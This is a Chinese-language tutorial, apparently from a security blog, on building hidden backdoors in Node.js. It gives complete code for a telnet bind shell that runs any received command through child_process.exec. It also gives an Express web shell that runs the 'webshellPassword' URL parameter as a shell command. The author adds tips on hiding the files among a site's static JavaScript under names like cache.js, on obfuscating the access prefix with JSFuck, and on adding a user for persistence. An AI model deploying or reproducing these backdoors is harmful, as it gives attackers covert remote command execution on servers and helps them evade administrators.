# NodeJs后门程序

0x00 前言
=======

* * *

从语言下手，来写一个市面没有的后面程序。

0x01 为什么选择NodeJs
================

* * *

1.  我个人非常喜爱JavaScript这门语言，而我们今天所说的就是NodeJS，JavaScript语言的一个分支。NodeJS本身就是一个Web 服务器同时他还是一门后端语言，这一点尤其重要，因为我们只需要下载一个NodeJs就可以完成一系列操作，从而免去很多的麻烦。
2.  而且即使被运维人员发现，也会以为是开发部门正在写有关NodeJs的项目。
3.  NodeJs是一个非常年轻的语言，以至于很多人都没有学过。我见过运维人员懂PHP、Python的，但是懂NodeJs的，我是没见过。
    
    接下来的篇章，我会使用telnet通信和web通信两个方式来写NodeJs后面程序。
    
4.  下一篇再说
    

0x02 前期准备工作
===========

* * *

有关NodeJs安装的，请自行百度。

我这里使用的是NodeJs版本是5.1.0

![p1](http://drops.javaweb.org/uploads/images/8cb0196902ac3f5d533c403ae1550cbfaceffaa2.jpg)

NodeJs安装完成后，我们可以随便在哪一个目录建立一个NodeJs文件，当然我这里推荐在服务器网站上的静态目录里的JavaScript目录来写，因为都是JavaScript文件，有很大的隐蔽性。我嫌麻烦，就在~目录下建立一个nodeDemo目录来建立NodeJs文件了。

我这里建立的是app.js，当然名字随便取，你可以取base.js、cache.js、cookies.js等等，起到隐蔽性就行了。

0x03 telnet通信后门
===============

* * *

NodeJs里使用telnet进行通信的时候，需要调用`net`库和`child_process`库里的exec方法。

代码如下：

```
var net = require('net');
var exec = require('child_process').exec;

```

然后使用createServer()函数来创建连接，代码如下：

```
var server= net.createServer(function(conn){
    //code
});

```

接下来要解决字符串编码问题，不然乱码真的没法看：

```
conn.setEncoding('utf8');

```

注意这里没有`-`，不是`utf-8`。切记。

为了好看，我还特意加上了`conn.write('\n')`;恩，这样好看多了。

OK，接下来就是连接成功后，处理输入的字符串了。这里需要用on函数：

```
conn.on('data',function(data){
//code
});

```

在输入后的字符串里，删除掉回车字符串。

```
data=data.replace('\r\n','');

```

**这段代码非常重要。**我被这个坑卡了二十分钟。很多人可能会问不就是个回车么，按两次回车键怎么了。问题就在这。他这是ascll编码，也就是说你这个不会回车，而是回车的ascll编码，如果没有这个命令，你输入的命令都将无法使用，你用echo输出到的文件也会变成xxx.txt?这里并不是真正的?，而是系统无法显示出这个字符，而用?告诉人们，这是一个无法显示的字符串。

这里的data变量就是我们输入的命令了。接下来就要用到`child_process`库里的exec方法了。

```
exec(data,function(error,stdout){
    //code
});

```

exec的第一个参数是data，也就是我们要运行的代码，后面的参数是个函数，这个函数里的一个参数是error，他是反馈命令中存在的错误。二个参数stdout是命令运行后的反馈。

我们先判断运行的命令中是否存在错误：

```
if(error !== null){
    conn.write(error + '\n');
    return false;       
}

```

如果没有错误会反馈null字符串，我们就拿这个当做判断条件。Conn.write是在telnet终端反馈字符的，相当于php中的echo。

`return false;`是防止程序继续向下执行。

接下来就是显示命令反馈了：

```
conn.write('########################start\n\n' + stdout + '\n########################end\n\n');

```

为了更加的直观，我用#start和#end来标出反馈的区域。

server变量OK后，就是让程序监听端口运行了。

```
server.listen(3000,function(){
    console.log('OK');
});

```

监听3000端口，并在终端中显示OK。

完整代码如下：

```
var net = require('net');
var exec = require('child_process').exec;
var server= net.createServer(function(conn){
    conn.setEncoding('utf8');
    conn.write('\n');
    conn.on('data',function(data){
        data=data.replace('\r\n','');
        exec(data,function(error,stdout){
            if(error !== null){
                conn.write(error + '\n');
                return false;       
            }
            conn.write('########################start\n\n' + stdout + '\n########################end\n\n');
        });
    });
}); 

server.listen(3000,function(){
    console.log('OK');
});

```

现在让我们来测试一下：

![p2](http://drops.javaweb.org/uploads/images/c918cac536243e55ffe66be74f9039620dba7fe8.jpg)

打开另一个终端，输入`telnet 127.0.0.1 3000`

![p3](http://drops.javaweb.org/uploads/images/6537eb63363989e01016c416c4b3b860ab25ffb3.jpg)

现在我们输入几条命令试下：

![p4](http://drops.javaweb.org/uploads/images/b15f362f4d00b5ec3229c5711481c5e508fd3e97.jpg)

![p5](http://drops.javaweb.org/uploads/images/9b2d032ce09e4f4aaaea892f73839f7ff9f40ef3.jpg)

OK了。现在只需要使用添加用户即可再次控制机器。

而这里有个缺陷，就是没有密码验证，我特意查了net库里的函数，但是没有找到密码验证，于是我想到了另一种方法来代替密码验证。代码如下：

```
if(data.substring(0,2) == 'js'){
    data = data.substring(2);
}else{
    return false;
}

```

每一条命令的前面都加上js才会运行，如果没有，则什么都不输出。事例：

![p6](http://drops.javaweb.org/uploads/images/ea5b2dcee03c6b89da799803e9df65f5dd69a841.jpg)

加上当我第一次输入ls的时候，程序并没有运行，当前面加上js字符串之后，命令才成功的运行。

直接写js字符串太显眼了，我们加密一下吧，因为NodeJs用的v8引擎，那么在浏览器里的JavaScript黑魔法，在NodeJs里也可以使用，我们打开[http://www.jsfuck.com/](http://www.jsfuck.com/)把js加密下，加密后的字符串是：

```
(+(!+[]+!+[]+!+[]+!+[]+[+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+[+!+[]])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]

```

如图：

![p7](http://drops.javaweb.org/uploads/images/0bbd928850c8647c260bdc400f4c4cfba49e3023.jpg)

那么现在的NodeJs后门代码就变成这个样子：

![p8](http://drops.javaweb.org/uploads/images/c5a04367f2f53449e398afef1dbc91ed8dea5c6c.jpg)

现在我们来测试一下能不能使用：

![p9](http://drops.javaweb.org/uploads/images/f2edfb1e96c585f6ccb21b5df6258e54f5768222.jpg)

完美。

0x03 web通信后门
============

* * *

上节说道使用telnet通信当做后门，那么现在我们来说一说web通信后门。

这里是使用了express框架吗，玩过NodeJs的人都知道，基本是NodeJs必装框架。

安装express框架请自行百度。

首先我们建立一个网站目录用于存放后面程序。

express node如图：

![p10](http://drops.javaweb.org/uploads/images/193eaa247a71fa332935556f9ad64d81900c410d.jpg)

```
cd node && npm install

```

完成后，基本就OK了。现在我们进入到routes目录。修改index.js文件。

```
vim router/index.js

```

![p11](http://drops.javaweb.org/uploads/images/2e6017e7364d37511418d5b3f04fa9c7ffc6eede.jpg)

这是之前的index.js代码，现在我们来修改它。

在第三行加入代码：

```
var exec = require('child_process').exec;

```

删除第6行代码，修改为：

```
exec(req.query.webshellPassword,function(error,stdout){
    if(error !== null){
        res.send(error);
        return false;
    }
    res.send(stdout);
});

```

基本和上一节的telnet通信后门代码差不多。只是出现了如下代码：

```
req.query.webshellPassword

```

`req.query`是NodeJs获取URL参数的。webshellPassword是参数名。他相当于PHP代码里的：`$_GET['webshallPassword'];`

完整代码如下：

![p12](http://drops.javaweb.org/uploads/images/e068c5ce92b56d8eceecdd87f14850a7d4c91004.jpg)

现在我们进入到node目录。运行它：

![p13](http://drops.javaweb.org/uploads/images/4f4d42e6a70d79a736a3a7ee500bebbbacf6bbda.jpg)

打开浏览器，输入`http://127.0.0.1:3000/?webshellPassword=ls`

结果如下：

![p14](http://drops.javaweb.org/uploads/images/3df91671ffaa1e75252a41bde10b3c1cb8b40862.jpg)

浏如果是window系统，没有装linux命令集的话，请把ls改成dir。

我们来大致看一下能做哪些事：

![p15](http://drops.javaweb.org/uploads/images/e5e3b24448d7c061d99f4fb61a99dc6f41527b92.jpg)

![p16](http://drops.javaweb.org/uploads/images/568a2ee250cfbe7823b94a6ff8ce76dda5560404.jpg)

![p17](http://drops.javaweb.org/uploads/images/ad3fbd9435069d15a6fab6692478798181bceebc.jpg)

![p18](http://drops.javaweb.org/uploads/images/df62a3af1c4a62ad5e08e6ee457bf2581b9d3276.jpg)

想干啥都可以，心情瞬间变得更美丽的呢。

下一章将说到使用网站来管理后门。麻麻再也不用担心我天天抱着电脑了呢。